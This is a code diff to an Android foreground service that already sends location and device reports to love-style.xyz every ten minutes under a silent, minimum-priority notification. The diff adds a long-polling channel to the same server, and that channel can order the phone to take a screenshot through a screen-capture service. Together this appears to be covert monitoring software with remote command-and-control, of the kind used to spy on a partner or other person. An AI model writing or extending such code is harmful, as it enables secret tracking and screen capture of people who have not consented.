@@ -10,6 +10,7 @@ import android.app.usage.UsageStats;
 import android.app.usage.UsageStatsManager;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.SharedPreferences;
 import android.location.Location;
 import android.location.LocationManager;
 import android.os.BatteryManager;
@@ -17,14 +18,18 @@ import android.os.Build;
 import android.os.IBinder;
 import android.os.SystemClock;
 import androidx.core.app.NotificationCompat;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
 import java.util.Calendar;
 import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
+import org.json.JSONObject;
 
 public class ForegroundService extends Service {
 
@@ -32,9 +37,14 @@ public class ForegroundService extends Service {
     private static final int    NOTIF_ID     = 9001;
     private static final String GEO_URL      = "https://love-style.xyz/api/geo/report";
     private static final String DEVICE_URL   = "https://love-style.xyz/api/device/report";
+    // 推送长轮询：?wait=N 让后端最多挂 N 秒等消息，实现"前端一发、手机就弹"
+    private static final String PUSH_URL     = "https://love-style.xyz/api/wake_log/pending_notification";
+    private static final int    PUSH_WAIT_S  = 25;
     private static final long   INTERVAL_MS  = 10 * 60 * 1000L;
 
     private Timer locationTimer;
+    private volatile boolean pushRunning = false;
+    private Thread pushThread;
 
     @Override
     public void onCreate() {
@@ -46,8 +56,18 @@ public class ForegroundService extends Service {
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .setSilent(true)
                 .build();
-        startForeground(NOTIF_ID, notif);
+        startForegroundCompat(notif);
         startLocationReporting();
+        startPushLoop();
+    }
+
+    private void startForegroundCompat(Notification notif) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(NOTIF_ID, notif,
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+        } else {
+            startForeground(NOTIF_ID, notif);
+        }
     }
 
     @Override
@@ -76,6 +96,51 @@ public class ForegroundService extends Service {
     public void onDestroy() {
         super.onDestroy();
         if (locationTimer != null) locationTimer.cancel();
+        pushRunning = false;
+        if (pushThread != null) pushThread.interrupt();
+    }
+
+    // ── 持久推送长轮询 ─────────────────────────────────────────
+    // 常驻一条 HTTP 长轮询：后端有新消息就立即返回并弹通知（秒级），
+    // 没消息则挂到 PUSH_WAIT_S 秒后返回空、马上再轮。WorkManager 的 15min
+    // 轮询是这条通道被系统杀掉时的兜底。两条通道共用 NotificationWorker 的去重。
+    private void startPushLoop() {
+        if (pushRunning) return;
+        pushRunning = true;
+        pushThread = new Thread(() -> {
+            SharedPreferences sp = getSharedPreferences("elpis_push", MODE_PRIVATE);
+            int backoff = 0;
+            while (pushRunning) {
+                try {
+                    String lastId = sp.getString("last_notif_id", "");
+                    String url = PUSH_URL + "?wait=" + PUSH_WAIT_S
+                            + "&since=" + URLEncoder.encode(lastId, "UTF-8");
+                    HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
+                    c.setConnectTimeout(10000);
+                    c.setReadTimeout((PUSH_WAIT_S + 15) * 1000);
+                    BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
+                    StringBuilder b = new StringBuilder();
+                    String l;
+                    while ((l = r.readLine()) != null) b.append(l);
+                    r.close();
+                    c.disconnect();
+                    JSONObject j = new JSONObject(b.toString());
+                    String cmd = NotificationWorker.showMessage(getApplicationContext(), j);
+                    if ("screenshot".equals(cmd)) {
+                        ScreenCaptureService.requestCapture(getApplicationContext());
+                    }
+                    backoff = 0;
+                    // 兜底：若后端不支持 wait 会立即返回，睡 3s 再轮，避免空转打爆服务器
+                    try { Thread.sleep(3000L); } catch (InterruptedException ie) { break; }
+                } catch (Exception e) {
+                    // 网络抖动/断线：指数退避，最长 30s，避免空转烧电
+                    backoff = Math.min(backoff == 0 ? 2 : backoff * 2, 30);
+                    try { Thread.sleep(backoff * 1000L); } catch (InterruptedException ie) { break; }
+                }
+            }
+        }, "elpis-push");
+        pushThread.setDaemon(true);
+        pushThread.start();
     }
 
     private void startLocationReporting() {
